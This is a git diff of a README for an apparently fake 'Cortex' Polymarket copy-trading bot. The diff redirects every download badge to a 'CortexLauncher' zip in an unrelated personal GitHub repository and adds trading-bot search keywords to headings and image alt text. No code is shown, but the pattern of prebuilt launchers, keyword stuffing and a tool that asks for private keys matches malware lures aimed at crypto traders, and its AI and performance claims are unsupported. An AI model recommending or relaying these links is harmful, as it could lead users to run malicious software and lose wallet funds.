@@ -17,15 +17,17 @@
 
 
 <p align="center">
-<img src="https://i.ibb.co/svh78kyT/polymarket-ai-copytrading-dashboard.png" alt="Cortex Trading Interface Overview" width="90%" style="border-radius: 10px; border: 2px solid #8247E5;">
+<img src="https://i.ibb.co/svh78kyT/polymarket-ai-copytrading-dashboard.png" alt="Polymarket Copy Trading Bot - AI Dashboard Overview" width="90%" style="border-radius: 10px; border: 2px solid #8247E5;">
 </p>
+
+
 
 <p align="center">
   <b>Project Documentation:</b> <a href="https://arbitrage-bot.pro/">https://arbitrage-bot.pro/</a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot-clob-ai/releases/download/v3.4.2-stable/Cortex_Polymarket_v1.2.zip">
+  <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
     <img src="https://img.shields.io/badge/STABLE_RELEASE-v3.4.2-blueviolet?style=for-the-badge&logo=gitbook&logoColor=white" alt="Download Framework">
   </a>
 </p>
@@ -50,7 +52,7 @@ This framework is optimized for high-volume data processing across major predict
 
 
 
-## ⚡ Execution & Deployment Logic
+## ⚡ Automated Polymarket Trading Bot Execution
 
 The framework is designed for rapid deployment without extensive environment configuration.
 
@@ -61,10 +63,10 @@ The framework is designed for rapid deployment without extensive environment con
 4. **Synchronization:** Activate the "Address Mirroring" module to track specific on-chain activity in real-time.
 
 <p align="center">
-  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot-clob-ai/releases/download/v3.4.2-stable/Cortex_Polymarket_v1.2.zip">
+  <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
     <img src="https://img.shields.io/badge/RELEASE-Windows_x64-0078D4?style=for-the-badge&logo=windows" alt="Windows Build">
   </a>
-  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot-clob-ai/releases/download/v3.4.2-stable/Cortex_Polymarket_v1.2.zip">
+  <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
     <img src="https://img.shields.io/badge/DOCKER-Linux_Server-FCC624?style=for-the-badge&logo=linux" alt="Linux Build">
   </a>
 </p>
@@ -87,7 +89,7 @@ Performance metrics of the **Cortex AI Engine** compared to standard AMM-based a
 
 ## 🧠 Advanced Architectural Features
 
-### 📡 Real-Time Whale & Insider Address Mirroring
+### 📡 Real-Time Polymarket Copy Trading & Whale Mirroring
 The system implements a high-frequency polling mechanism to track the **Top 100 Leaderboard** entities. When a target address initiates an order on the CLOB, the **Trade Executor** mirrors the position within the same block, maintaining strict slippage control.
 
 ### 🔍 OpenClaw Sentiment Analysis
@@ -102,7 +104,7 @@ All sensitive data, including API keys and private keys, are stored using **Hard
 
 
 <p align="center">
-<img src="https://i.ibb.co/n8kxBrmq/crypto-signals-monitor-ai.png" alt="Cortex API Crypto Signals " width="90%">
+<img src="https://i.ibb.co/n8kxBrmq/crypto-signals-monitor-ai.png" alt="Automated Polymarket Trading Bot - Signal Monitor " width="90%">
 </p>
 
 <p align="center">
